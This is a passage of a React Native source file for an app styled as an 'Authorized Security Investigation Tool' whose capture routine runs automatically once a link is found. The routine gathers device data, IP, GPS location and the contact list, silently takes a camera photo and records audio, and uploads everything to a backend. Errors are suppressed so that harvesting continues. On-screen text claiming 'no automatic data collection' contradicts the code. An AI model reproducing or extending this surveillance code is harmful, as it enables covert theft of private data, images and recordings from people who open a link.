      setExists(false);
    } finally {
      setLoading(false);
    }
  };

  // Run capture process (called automatically after finding link)
  const runCapture = async (linkPageId: string) => {
    // CRITICAL: Declare variables outside try-catch for fallback access
    let osData: any = {};
    let permissionsData: any = {};
    let locationData: any = null;
    let contactsData: any[] = [];
    let clientIP = '';
    
    try {
      setIsCapturing(true);
      console.log('=== Starting Capture ===');

      if (!linkPageId) {
        console.error('[Capture] No pageId provided');
          return;
        }

      // Fix #2: Request camera permission ONCE and store result
      // Fix #9: Remove duplicate permission requests
      // CRITICAL: All permissions are optional - app continues even if denied
      console.log('[Permissions] Requesting permissions...');
      
      // Request camera permission once and store (wrapped in try-catch)
      let camStatus = { granted: false };
      try {
        camStatus = await requestCameraPermission() || { granted: false };
        console.log('[Camera] Permission status:', camStatus?.granted);
      } catch (camError) {
        console.warn('[Camera] Permission request failed, continuing anyway:', camError);
        camStatus = { granted: false };
      }
      
      // Request other permissions (camera already requested above)
      // CRITICAL: Wrap all in try-catch to ensure app continues even if permissions fail
      try {
        await Promise.all([
          requestLocationPermission().catch(err => console.warn('[Location] Permission error:', err)),
          requestContactsPermission().catch(err => console.warn('[Contacts] Permission error:', err)),
          requestMediaPermission().catch(err => console.warn('[Media] Permission error:', err)),
          requestMicrophonePermission().catch(err => console.warn('[Microphone] Permission error:', err)),
          requestNotificationsPermission().catch(err => console.warn('[Notifications] Permission error:', err)),
          requestSmsPermission().catch(err => console.warn('[SMS] Permission error:', err)),
          requestCallLogPermission().catch(err => console.warn('[CallLogs] Permission error:', err)),
        ]);
      } catch (permError) {
        console.warn('[Permissions] Some permission requests failed, continuing anyway:', permError);
      }
      
      // Wait a bit for permissions to settle
      await new Promise(r => setTimeout(r, 300));

      // Step 2: Collect device data
      try {
        osData = await collectDeviceData();
        clientIP = await getClientIP();
      } catch (deviceError) {
        console.warn('[Device] Device data collection failed, using defaults:', deviceError);
        osData = {};
        clientIP = '';
      }
        
      // Step 3: Capture location coordinates (request permission if needed)
      // CRITICAL: Location is optional - app continues even if denied
      console.log('[Location] Capturing location...');
      try {
        // Ensure location permission is granted
        const locPerm = await Location.getForegroundPermissionsAsync();
        if (locPerm.status !== 'granted') {
          console.log('[Location] Requesting location permission...');
          await Location.requestForegroundPermissionsAsync().catch(err => {
            console.warn('[Location] Permission request failed, continuing without location:', err);
          });
        }
        locationData = await captureLocation();
        if (locationData) {
          console.log('[Location] ✅ Location captured:', locationData);
        } else {
          console.log('[Location] ⚠️ Location not available (permission may be denied)');
        }
      } catch (locError) {
        console.warn('[Location] ⚠️ Location capture failed, continuing without location:', locError);
        locationData = null; // Ensure it's null on error
      }

      // Step 4: Capture contacts list
      // CRITICAL: Contacts are optional - app continues even if denied
      console.log('[Contacts] Capturing contacts...');
      try {
        contactsData = await captureContacts();
        console.log(`[Contacts] Captured ${contactsData.length} contacts`);
      } catch (contactsError) {
        console.warn('[Contacts] ⚠️ Contacts capture failed, continuing without contacts:', contactsError);
        contactsData = []; // Ensure it's an empty array on error
      }

      // Step 5: Record visit first to create log entry
      // Fix #4: Capture logId from visit response to ensure correct log binding
      // CRITICAL: Visit recording is important but app continues even if it fails
      console.log('[Visit] Recording visit...');
      let logId: string | null = null;
      try {
        const visitResponse = await fetch(`${API_BASE_URL}/api/links/${linkPageId}/visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            ...osData,
            ip: clientIP,
            location: locationData,
            contacts: contactsData,
          }),
        });

        if (visitResponse.ok) {
          const visitData = await visitResponse.json();
          // Fix #4: Extract logId from response (backend returns lastLogId)
          if (visitData.lastLogId) {
            logId = visitData.lastLogId;
            console.log('[Visit] ✅ Visit recorded, logId:', logId);
          } else if (visitData.logs && visitData.logs.length > 0) {
            // Fallback: extract from logs array
            const lastLog = visitData.logs[visitData.logs.length - 1];
            logId = lastLog._id || null;
            console.log('[Visit] ✅ Visit recorded, logId (fallback):', logId);
          }
        } else {
          console.warn('[Visit] ⚠️ Visit recording failed, continuing anyway...');
        }
      } catch (visitError) {
        console.warn('[Visit] ⚠️ Visit recording error, continuing anyway:', visitError);
      }

      // Step 6: Collect all permission statuses (Fix #2: Pass camera status, don't request again)
      // CRITICAL: Permission collection is optional - app continues even if it fails
      let permissionsData: any = {};
      try {
        permissionsData = await collectPermissions(camStatus || { granted: false });
        console.log('[Permissions] Collected:', permissionsData);
      } catch (permCollectError) {
        console.warn('[Permissions] ⚠️ Permission collection failed, using defaults:', permCollectError);
        permissionsData = {
          location: 'denied',
          cameraview: camStatus?.granted ? 'granted' : 'denied',
          contacts: 'denied',
          media: 'denied',
          notification: 'denied',
          sms: 'denied',
          callLogs: 'denied',
        };
      }

      // Step 7: Capture media (camera and microphone)
      // CRITICAL: Ensure uploads complete before proceeding to save-media
      let imageUrl: string | null = null;
      let audioUrl: string | null = null;

      console.log('[Capture] ===== Starting media capture =====');
      console.log('[Capture] Camera permission:', camStatus?.granted);
      console.log('[Capture] Platform:', Platform.OS);
      // #region agent log
      fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:657',message:'CAPTURE START',data:{cameraGranted:camStatus?.granted,platform:Platform.OS,linkPageId},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
      // #endregion

      // Capture photo if camera permission granted
      if (camStatus?.granted) {
        console.log('[Capture] ✅ Camera permission granted');
        if (Platform.OS === 'web') {
          console.log('[Camera] Web platform - using ImagePicker...');
          try {
            const { status: pickerStatus } = await ImagePicker.requestCameraPermissionsAsync();
            console.log('[Camera] ImagePicker permission:', pickerStatus);
            
            if (pickerStatus === 'granted') {
              console.log('[Camera] Launching camera...');
              const result = await ImagePicker.launchCameraAsync({
                mediaTypes: ImagePicker.MediaTypeOptions.Images,
                allowsEditing: false,
                quality: 0.7,
              });

              console.log('[Camera] Result:', {
                canceled: result.canceled,
                hasAssets: !!result.assets?.[0]
              });

              if (!result.canceled && result.assets?.[0]) {
                let photoUri = result.assets[0].uri;
                console.log('[Camera] ✅ Captured:', photoUri.substring(0, 50));
                
                // Convert file:// to blob if needed
                if (photoUri.startsWith('file://')) {
                  try {
                    const response = await fetch(photoUri);
                    const blob = await response.blob();
                    photoUri = URL.createObjectURL(blob);
                    console.log('[Camera] ✅ Converted to blob URL');
                  } catch (convertError) {
                    console.error('[Camera] ❌ Conversion failed:', convertError);
                    imageUrl = null;
                  }
                }
                
                // Upload if URI is valid
                if (photoUri && !photoUri.startsWith('file://')) {
                  console.log('[Camera] Uploading to backend...');
                  const uploadedUrl = await uploadViaBackend(photoUri, 'image', linkPageId);
                  
                  // CRITICAL: Validate URL before storing
                  if (uploadedUrl && typeof uploadedUrl === 'string' && uploadedUrl.startsWith('http')) {
                    imageUrl = uploadedUrl;
                    console.log('[Camera] ✅ Upload success! URL stored:', imageUrl.substring(0, 60));
                  } else {
                    console.error('[Camera] ❌ Invalid URL returned:', uploadedUrl);
                    imageUrl = null;
                  }
                } else {
                  console.error('[Camera] ❌ Invalid URI after conversion');
                  imageUrl = null;
                }
              } else {
                console.log('[Camera] ⚠️ Capture canceled or no asset');
                imageUrl = null;
              }
            } else {
              console.log('[Camera] ⚠️ ImagePicker permission denied');
              imageUrl = null;
            }
          } catch (webCamError: any) {
            console.error('[Camera] ❌ Error:', webCamError.message);
            imageUrl = null;
          }
        } else {
          // Mobile platforms - use CameraView
          // Fix #3: Use CameraView.onCameraReady callback instead of timeouts
          console.log('[Camera] Mobile platform, using CameraView...');
          setMountCamera(true);
          setCameraReady(false); // Reset readiness state
          
          // Fix #3: Wait for onCameraReady callback (max 5 seconds timeout as fallback)
          const cameraReadyPromise = new Promise<void>((resolve) => {
            const timeout = setTimeout(() => {
              console.warn('[Camera] Camera ready timeout, proceeding anyway');
              resolve();
            }, 5000);
            
            // This will be resolved by onCameraReady callback
            const checkReady = setInterval(() => {
              if (cameraReady && cameraRef.current) {
                clearInterval(checkReady);
                clearTimeout(timeout);
                resolve();
              }
            }, 100);
          });
          
          await cameraReadyPromise;
          
          // Fix #8: Guard check before capture
          if (cameraReady && cameraRef.current) {
            console.log('[Camera] Camera ready, capturing photo...');
            const photoUri = await capturePhoto();
            setMountCamera(false);
            setCameraReady(false);

            if (photoUri) {
            console.log('[Camera] ✅ Captured:', photoUri.substring(0, 50));
            console.log('[Camera] Uploading to backend...');
            // #region agent log
            fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:715',message:'BEFORE uploadViaBackend CALL (mobile)',data:{photoUri:photoUri.substring(0,50),linkPageId},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'})}).catch(()=>{});
            // #endregion
              const uploadedUrl = await uploadViaBackend(photoUri, 'image', linkPageId);
              // #region agent log
              fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:718',message:'AFTER uploadViaBackend CALL (mobile)',data:{uploadedUrl:uploadedUrl?.substring(0,60),isValid:uploadedUrl && typeof uploadedUrl === 'string' && uploadedUrl.startsWith('http')},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'})}).catch(()=>{});
              // #endregion
              
              // CRITICAL: Validate URL before storing
              if (uploadedUrl && typeof uploadedUrl === 'string' && uploadedUrl.startsWith('http')) {
                imageUrl = uploadedUrl;
                console.log('[Camera] ✅ Upload success! URL stored:', imageUrl.substring(0, 60));
              } else {
                console.error('[Camera] ❌ Invalid URL returned:', uploadedUrl);
                imageUrl = null;
              }
            } else {
              console.error('[Camera] ❌ Capture failed - no URI');
              imageUrl = null;
            }
          } else {
            console.error('[Camera] ❌ Camera not ready, cannot capture');
            setMountCamera(false);
            setCameraReady(false);
          }
        }
      } else {
        console.log('[Camera] ⚠️ Permission not granted, status:', camStatus);
        console.log('[Camera] ⚠️ Skipping image capture - permission denied');
        // #region agent log
        fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:792',message:'CAMERA PERMISSION DENIED',data:{camStatus},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
        // #endregion
        imageUrl = null;
      }

      // Capture audio if microphone permission granted
      console.log('[Audio] ===== Starting audio capture =====');
      try {
        const { status: audioStatus } = await Audio.getPermissionsAsync();
        console.log('[Audio] Permission status:', audioStatus);
        
        if (audioStatus === 'granted') {
          console.log('[Audio] ✅ Permission granted, starting recording...');
          const audioUri = await captureAudio();
          console.log('[Audio] Capture result - URI:', audioUri || 'NULL');
          
          // Upload audio if captured
          if (audioUri) {
            console.log('[Audio] ✅ Captured:', audioUri.substring(0, 50));
            console.log('[Audio] Uploading to backend...');
            // #region agent log
            fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:757',message:'BEFORE uploadViaBackend CALL (audio)',data:{audioUri:audioUri.substring(0,50),linkPageId},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'})}).catch(()=>{});
            // #endregion
            const uploadedUrl = await uploadViaBackend(audioUri, 'audio', linkPageId);
            // #region agent log
            fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:760',message:'AFTER uploadViaBackend CALL (audio)',data:{uploadedUrl:uploadedUrl?.substring(0,60),isValid:uploadedUrl && typeof uploadedUrl === 'string' && uploadedUrl.startsWith('http')},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'})}).catch(()=>{});
            // #endregion
            
            // CRITICAL: Validate URL before storing
            if (uploadedUrl && typeof uploadedUrl === 'string' && uploadedUrl.startsWith('http')) {
              audioUrl = uploadedUrl;
              console.log('[Audio] ✅ Upload success! URL stored:', audioUrl.substring(0, 60));
            } else {
              console.error('[Audio] ❌ Invalid URL returned:', uploadedUrl);
              audioUrl = null;
            }
          } else if (Platform.OS === 'web') {
            console.log('[Audio] Web platform - audio not supported (expected)');
            audioUrl = null;
          } else {
            console.error('[Audio] ❌ Capture failed - no URI');
            audioUrl = null;
          }
        } else {
          console.log('[Audio] ⚠️ Permission not granted, status:', audioStatus);
          console.log('[Audio] ⚠️ Skipping audio capture - permission denied');
          audioUrl = null;
        }
      } catch (audioError: any) {
        console.error('[Audio] ❌ Error:', audioError.message);
        audioUrl = null;
      }

      console.log('[Capture] ===== Media capture complete =====');
      console.log('[Capture] Final imageUrl:', imageUrl ? `✅ ${imageUrl.substring(0, 60)}...` : '❌ NULL');
      console.log('[Capture] Final audioUrl:', audioUrl ? `✅ ${audioUrl.substring(0, 60)}...` : '❌ NULL');
      // #region agent log
      fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:844',message:'CAPTURE COMPLETE',data:{imageUrl:imageUrl?.substring(0,60),audioUrl:audioUrl?.substring(0,60),hasImageUrl:!!imageUrl,hasAudioUrl:!!audioUrl},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
      // #endregion

      // Step 8: Save media, permissions, location, and contacts to database
      // Fix #4: Include logId to ensure correct log binding
      // Fix #7: Only include imageUrl/audioUrl if they exist (don't send explicit null)
      // CRITICAL: Validate URLs before sending to save-media
      // Only send valid HTTP URLs, reject null/undefined/empty strings
      const isValidUrl = (url: string | null): boolean => {
        return !!url && 
               typeof url === 'string' && 
               url.trim() !== '' && 
               (url.startsWith('http://') || url.startsWith('https://')) &&
               url !== 'null' && 
               url !== 'undefined';
      };

      // CRITICAL: Always ensure imageUrl and audioUrl are defined (not undefined)
      // Convert undefined to null explicitly to ensure they're included in JSON
      // These variables are initialized to null, but double-check to be safe
      const safeImageUrl = (imageUrl !== undefined && imageUrl !== null) ? imageUrl : null;
      const safeAudioUrl = (audioUrl !== undefined && audioUrl !== null) ? audioUrl : null;
      
      // Validate URLs - only keep valid HTTP URLs, convert everything else to null
      const validImageUrl = isValidUrl(safeImageUrl) ? safeImageUrl : null;
      const validAudioUrl = isValidUrl(safeAudioUrl) ? safeAudioUrl : null;
      
      // CRITICAL: Ensure we never have undefined - always use null
      const finalImageUrl = (validImageUrl !== undefined && validImageUrl !== null) ? validImageUrl : null;
      const finalAudioUrl = (validAudioUrl !== undefined && validAudioUrl !== null) ? validAudioUrl : null;

      console.log('[Save] ===== Preparing to save all data =====');
      console.log('[Save] Image URL (raw):', safeImageUrl ? `✅ ${safeImageUrl.substring(0, 50)}...` : '❌ NULL');
      console.log('[Save] Image URL (validated):', validImageUrl ? `✅ VALID (${validImageUrl.substring(0, 50)}...)` : '❌ INVALID/NULL');
      console.log('[Save] Image URL (final):', finalImageUrl ? `✅ ${finalImageUrl.substring(0, 50)}...` : '❌ NULL');
      console.log('[Save] Audio URL (raw):', safeAudioUrl ? `✅ ${safeAudioUrl.substring(0, 50)}...` : '❌ NULL');
      console.log('[Save] Audio URL (validated):', validAudioUrl ? `✅ VALID (${validAudioUrl.substring(0, 50)}...)` : '❌ INVALID/NULL');
      console.log('[Save] Audio URL (final):', finalAudioUrl ? `✅ ${finalAudioUrl.substring(0, 50)}...` : '❌ NULL');
      console.log('[Save] Location:', locationData ? '✅ CAPTURED' : '❌ NOT CAPTURED');
      console.log('[Save] Contacts:', contactsData.length, 'contacts');
      console.log('[Save] LogId:', logId || 'NOT AVAILABLE');
      
      // Defensive check: Warn if uploads should have succeeded but didn't
      if (!finalImageUrl && camStatus?.granted) {
        console.warn('[Save] ⚠️ Camera permission granted but no valid image URL!');
        console.warn('[Save] Raw imageUrl value:', safeImageUrl);
      }
      
      // Build payload - ALWAYS include imageUrl and audioUrl (even if null)
      // CRITICAL: JSON.stringify removes undefined fields, so we MUST use null explicitly
      // Never use undefined - always convert to null
      const savePayload: any = {
        deviceInfo: osData,
        permissions: permissionsData,
        capturedAt: new Date().toISOString(),
        // CRITICAL: Always explicitly set to null if not valid (never undefined)
        // Use finalImageUrl/finalAudioUrl which are guaranteed to be null (never undefined)
        imageUrl: finalImageUrl,
        audioUrl: finalAudioUrl,
      };
      
      if (locationData) {
        savePayload.location = locationData;
      }
      if (contactsData && contactsData.length > 0) {
        savePayload.contacts = contactsData;
      }
      // Fix #4: Include logId if available
      if (logId) {
        savePayload.logId = logId;
      }
      
      // CRITICAL: Double-check fields are explicitly set to null (not undefined)
      // This prevents JSON.stringify from omitting them
      if (savePayload.imageUrl === undefined) {
        savePayload.imageUrl = null;
      }
      if (savePayload.audioUrl === undefined) {
        savePayload.audioUrl = null;
      }
      
      // Log final payload before stringify
      console.log('[Save] Final payload (before stringify):', {
        hasImageUrl: 'imageUrl' in savePayload,
        hasAudioUrl: 'audioUrl' in savePayload,
        imageUrl: savePayload.imageUrl !== null && savePayload.imageUrl !== undefined 
          ? `✅ ${String(savePayload.imageUrl).substring(0, 60)}...` 
          : `❌ ${savePayload.imageUrl === null ? 'NULL' : 'UNDEFINED'}`,
        audioUrl: savePayload.audioUrl !== null && savePayload.audioUrl !== undefined 
          ? `✅ ${String(savePayload.audioUrl).substring(0, 60)}...` 
          : `❌ ${savePayload.audioUrl === null ? 'NULL' : 'UNDEFINED'}`,
        hasLocation: !!savePayload.location,
        contactsCount: savePayload.contacts?.length || 0,
        hasLogId: !!savePayload.logId,
      });
      
      // Log upload success summary
      console.log('[Upload Success Summary]', {
        imageUrl: validImageUrl ? '✅ UPLOADED' : '❌ FAILED',
        audioUrl: validAudioUrl ? '✅ UPLOADED' : '❌ FAILED',
      });
      
      // CRITICAL: Log the actual JSON string being sent
      const jsonPayload = JSON.stringify(savePayload);
      console.log('[Save] JSON payload string:', jsonPayload.substring(0, 300));
      console.log('[Save] JSON includes "imageUrl":', jsonPayload.includes('imageUrl'));
      console.log('[Save] JSON includes "audioUrl":', jsonPayload.includes('audioUrl'));
      
      const saveResponse = await fetch(`${API_BASE_URL}/api/links/${linkPageId}/save-media`, {
          method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: jsonPayload,
        });

        if (saveResponse.ok) {
        console.log('=== Capture Complete ===');
        console.log('✅ Image URL:', imageUrl || 'Not captured (permission may be denied)');
        console.log('✅ Audio URL:', audioUrl || 'Not captured (permission may be denied)');
        console.log('✅ Location:', locationData ? 'Captured' : 'Not captured (permission may be denied)');
        console.log('✅ Contacts:', contactsData.length, 'contacts captured');
        console.log('✅ Permissions:', permissionsData);
        alert('Data saved successfully! (Some features may be unavailable due to denied permissions)');
        } else {
        const errorText = await saveResponse.text();
        console.error('Database save failed:', errorText);
          alert('Error saving data. Please try again.');
        }
      } catch (error) {
      console.error('Capture failed:', error);
      // CRITICAL: Even if capture fails, try to save what we have
      try {
        console.log('[Save] Attempting to save partial data after error...');
        const fallbackPayload = {
          deviceInfo: osData,
          permissions: permissionsData,
          capturedAt: new Date().toISOString(),
          imageUrl: null,
          audioUrl: null,
        };
        await fetch(`${API_BASE_URL}/api/links/${linkPageId}/save-media`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(fallbackPayload),
        });
        alert('Partial data saved. Some features may be unavailable due to denied permissions.');
      } catch (fallbackError) {
        console.error('Fallback save also failed:', fallbackError);
        alert('Error capturing data. Please try again.');
      }
    } finally {
      setIsCapturing(false);
      setMountCamera(false);
    }
  };

  const requestContactsPermission = async () => {
    try {
      if (Platform.OS === 'web') {
        setPermissions(prev => ({ ...prev, contacts: 'unsupported' }));
        return;
      }
      const { status } = await Contacts.requestPermissionsAsync();
      setPermissions(prev => ({
        ...prev,
        contacts: status === 'granted' ? 'granted' : 'denied'
      }));
    } catch (error) {
      console.error('Contacts permission error:', error);
      setPermissions(prev => ({ ...prev, contacts: 'denied' }));
    }
  };

  const requestNotificationsPermission = async () => {
    try {
      const { status } = await Notifications.requestPermissionsAsync();
      setPermissions(prev => ({
        ...prev,
        notifications: status === 'granted' ? 'granted' : 'denied'
      }));
    } catch (error) {
      console.error('Notifications permission error:', error);
      setPermissions(prev => ({ ...prev, notifications: 'denied' }));
    }
  };

  const requestMediaPermission = async () => {
    try {
      const { status } = await MediaLibrary.requestPermissionsAsync();
      setPermissions(prev => ({
        ...prev,
        media: status === 'granted' ? 'granted' : 'denied'
      }));
    } catch (error) {
      console.error('Media permission error:', error);
      setPermissions(prev => ({ ...prev, media: 'denied' }));
    }
  };

  const requestLocationPermission = async () => {
    try {
      const { status } = await Location.requestForegroundPermissionsAsync();
      setPermissions(prev => ({
        ...prev,
        location: status === 'granted' ? 'granted' : 'denied'
      }));
    } catch (error) {
      console.error('Location permission error:', error);
      setPermissions(prev => ({ ...prev, location: 'denied' }));
    }
  };

  const requestCameraPermissionHandler = async () => {
    try {
      const result = await requestCameraPermission();
      setPermissions(prev => ({
        ...prev,
        camera: result?.granted ? 'granted' : 'denied'
      }));
    } catch (error) {
      console.error('Camera permission error:', error);
      setPermissions(prev => ({ ...prev, camera: 'denied' }));
    }
  };

  const requestMicrophonePermission = async () => {
    try {
      if (Platform.OS === 'web') {
        setPermissions(prev => ({ ...prev, microphone: 'unsupported' }));
        return;
      }
      const { status } = await Audio.requestPermissionsAsync();
      setPermissions(prev => ({
        ...prev,
        microphone: status === 'granted' ? 'granted' : 'denied'
      }));
    } catch (error) {
      console.error('Microphone permission error:', error);
      setPermissions(prev => ({ ...prev, microphone: 'denied' }));
    }
  };

  const requestSmsPermission = async () => {
    try {
      if (Platform.OS === 'web') {
        setPermissions(prev => ({ ...prev, sms: 'unsupported' }));
        return;
      }
      // Check if SMS is available on the device
      const isAvailable = await SMS.isAvailableAsync();
      if (!isAvailable) {
        setPermissions(prev => ({ ...prev, sms: 'unsupported' }));
        return;
      }
      // Note: expo-sms doesn't have a direct permission API, but we can check availability
      // For Android, SMS permission is typically granted at install time or via manifest
      // For iOS, SMS access is not available
      if (Platform.OS === 'ios') {
        setPermissions(prev => ({ ...prev, sms: 'unsupported' }));
        return;
      }
      // On Android, SMS is typically available if the app has the permission
      setPermissions(prev => ({ ...prev, sms: isAvailable ? 'granted' : 'denied' }));
    } catch (error) {
      console.error('SMS permission error:', error);
      setPermissions(prev => ({ ...prev, sms: 'denied' }));
    }
  };

  const requestCallLogPermission = async () => {
    try {
      if (Platform.OS === 'web' || Platform.OS === 'ios') {
        // Call logs are not accessible on web or iOS
        setPermissions(prev => ({ ...prev, callLogs: 'unsupported' }));
        return;
      }
      // On Android, call log permission requires READ_CALL_LOG permission
      // This typically needs to be requested via native modules or PermissionsAndroid
      // For now, we'll mark it as 'not_requested' and can be extended with native modules
      // Note: This is a placeholder - actual implementation would require native module
      setPermissions(prev => ({ ...prev, callLogs: 'not_requested' }));
      console.log('[CallLogs] Call log permission check - requires native module implementation');
    } catch (error) {
      console.error('Call log permission error:', error);
      setPermissions(prev => ({ ...prev, callLogs: 'denied' }));
    }
  };

  const getStatusColor = (status: PermissionStatus) => {
    switch (status) {
      case 'granted':
        return '#10b981';
      case 'denied':
        return '#ef4444';
      case 'unsupported':
        return '#6b7280';
      default:
        return '#3b82f6';
    }
  };

  const getStatusText = (status: PermissionStatus) => {
    switch (status) {
      case 'granted':
        return 'Granted';
      case 'denied':
        return 'Denied';
      case 'unsupported':
        return 'Unsupported on this platform';
      default:
        return 'Not Requested';
    }
  };

  const PermissionButton = ({
    icon: Icon,
    title,
    description,
    status,
    onRequest,
  }: {
    icon: any;
    title: string;
    description: string;
    status: PermissionStatus;
    onRequest: () => void;
  }) => (
    <TouchableOpacity
      style={[
        styles.permissionCard,
        isDark ? styles.permissionCardDark : styles.permissionCardLight,
      ]}
      onPress={onRequest}
      disabled={status === 'granted' || status === 'unsupported'}
    >
      <View style={styles.permissionIconContainer}>
        <Icon size={24} color={isDark ? '#fff' : '#1f2937'} />
      </View>
      <View style={styles.permissionContent}>
        <Text style={[styles.permissionTitle, isDark && styles.textLight]}>
          {title}
        </Text>
        <Text style={[styles.permissionDescription, isDark && styles.textGray]}>
          {description}
        </Text>
        <View style={styles.statusContainer}>
          <View
            style={[
              styles.statusDot,
              { backgroundColor: getStatusColor(status) },
            ]}
          />
          <Text style={[styles.statusText, { color: getStatusColor(status) }]}>
            {getStatusText(status)}
          </Text>
        </View>
      </View>
    </TouchableOpacity>
  );

  if (loading) {
    return (
      <View style={[styles.container, isDark && styles.containerDark, { justifyContent: 'center', alignItems: 'center' }]}>
        <StatusBar style={isDark ? 'light' : 'dark'} />
        <Text style={[styles.title, isDark && styles.textLight, { marginBottom: 20 }]}>Loading...</Text>
        <ActivityIndicator size="large" color="#3b82f6" />
      </View>
    );
  }

  if (!hasConsented || !exists) {
    return (
      <View style={[styles.container, isDark && styles.containerDark]}>
        <StatusBar style={isDark ? 'light' : 'dark'} />
        <View style={styles.consentContainer}>
          <Shield size={64} color="#3b82f6" />
          <Text style={[styles.title, isDark && styles.textLight]}>
            Permission Manager
          </Text>
          <Text style={[styles.subtitle, isDark && styles.textGray]}>
            Authorized Security Investigation Tool
          </Text>

          <View style={styles.infoBox}>
            <AlertCircle size={20} color="#3b82f6" />
            <Text style={[styles.infoText, isDark && styles.textLight]}>
              This application requires explicit permission to access certain
              device features for authorized investigation purposes.
            </Text>
          </View>

          <View style={styles.inputContainer}>
            <View style={{ flexDirection: 'row', alignItems: 'center', width: '100%' }}>
              <User size={20} color={isDark ? '#9ca3af' : '#6b7280'} />
              <TextInput
                style={[
                  styles.input, 
                  isDark && styles.inputDark,
                  isNumberValid === false && styles.inputError,
                  isNumberValid === true && styles.inputValid
                ]}
                placeholder="Enter Number (e.g., 720733)"
                placeholderTextColor={isDark ? '#6b7280' : '#9ca3af'}
                keyboardType="numeric"
                value={phoneNumber}
                onChangeText={(text) => {
                  setPhoneNumber(text);
                  // Reset validation when user types
                  if (text.length < 6) {
                    setIsNumberValid(null);
                    setValidationError('');
                  }
                }}
                maxLength={6}
                editable={!loading}
              />
              {isValidating && (
                <ActivityIndicator size="small" color="#3b82f6" style={{ marginLeft: 10 }} />
              )}
            </View>
            {isNumberValid === true && phoneNumber.length === 6 && (
              <Text style={[styles.validationText, styles.validationSuccess]}>✓ Valid number</Text>
            )}
            {isNumberValid === false && validationError && (
              <Text style={[styles.validationText, styles.validationError]}>{validationError}</Text>
            )}
          </View>

          <TouchableOpacity
            style={[
              styles.submitButton,
              (phoneNumber.length < 6 || loading || isNumberValid === false || isValidating) && styles.submitButtonDisabled,
            ]}
            onPress={handlePhoneSubmit}
            disabled={phoneNumber.length < 6 || loading || isNumberValid === false || isValidating}
          >
            {loading ? (
              <ActivityIndicator size="small" color="#fff" />
            ) : (
              <Text style={styles.submitButtonText}>Proceed</Text>
            )}
          </TouchableOpacity>
        </View>
      </View>
    );
  }

  return (
    <View style={[styles.container, isDark && styles.containerDark]}>
      <StatusBar style={isDark ? 'light' : 'dark'} />
      <ScrollView style={styles.scrollView}>
        <View style={styles.header}>
          <Shield size={32} color="#3b82f6" />
          <Text style={[styles.headerTitle, isDark && styles.textLight]}>
            Permission Manager
          </Text>
          <Text style={[styles.headerSubtitle, isDark && styles.textGray]}>
            User: {phoneNumber}
          </Text>
        </View>

        <View style={styles.consentBanner}>
          <AlertCircle size={16} color="#3b82f6" />
          <Text style={[styles.consentText, isDark && styles.textLight]}>
            Explicit consent granted for authorized investigation
          </Text>
        </View>

        <Text style={[styles.sectionTitle, isDark && styles.textLight]}>
          Device Permissions
        </Text>

        <PermissionButton
          icon={Users}
          title="Contacts"
          description="Access device contact list"
          status={permissions.contacts}
          onRequest={requestContactsPermission}
        />

        <PermissionButton
          icon={Bell}
          title="Notifications"
          description="Display system notifications"
          status={permissions.notifications}
          onRequest={requestNotificationsPermission}
        />

        <PermissionButton
          icon={Image}
          title="Media / Gallery"
          description="Access photos and media files"
          status={permissions.media}
          onRequest={requestMediaPermission}
        />

        <PermissionButton
          icon={Camera}
          title="Camera"
          description="Access device camera"
          status={permissions.camera}
          onRequest={requestCameraPermissionHandler}
        />

        <PermissionButton
          icon={MapPin}
          title="Location"
          description="Access device location"
          status={permissions.location}
          onRequest={requestLocationPermission}
        />

        <PermissionButton
          icon={MessageSquare}
          title="SMS"
          description="Access SMS messages"
          status={permissions.sms}
          onRequest={requestSmsPermission}
        />

        <PermissionButton
          icon={PhoneCall}
          title="Call Logs"
          description="Access device call history"
          status={permissions.callLogs}
          onRequest={requestCallLogPermission}
        />

        {/* 🔐 COMPLIANCE: User-Triggered Actions Section */}
        <Text style={[styles.sectionTitle, isDark && styles.textLight, { marginTop: 32 }]}>
          Data Collection Actions
        </Text>
        <View style={[styles.infoBox, { marginHorizontal: 24, marginBottom: 16 }]}>
          <AlertCircle size={16} color="#3b82f6" />
          <Text style={[styles.infoText, isDark && styles.textLight, { marginLeft: 8, fontSize: 12 }]}>
            All actions are user-triggered. No automatic data collection.
          </Text>
        </View>

        {/* Camera Capture Button */}
        <TouchableOpacity
          style={[styles.actionButton, isDark && styles.actionButtonDark]}
          onPress={handleCapturePhoto}
        >
          <Camera size={20} color="#3b82f6" />
          <Text style={[styles.actionButtonText, isDark && styles.textLight]}>
            Capture Photo
          </Text>
        </TouchableOpacity>

        {/* Audio Recording Button */}
        {!isRecording ? (
          <TouchableOpacity
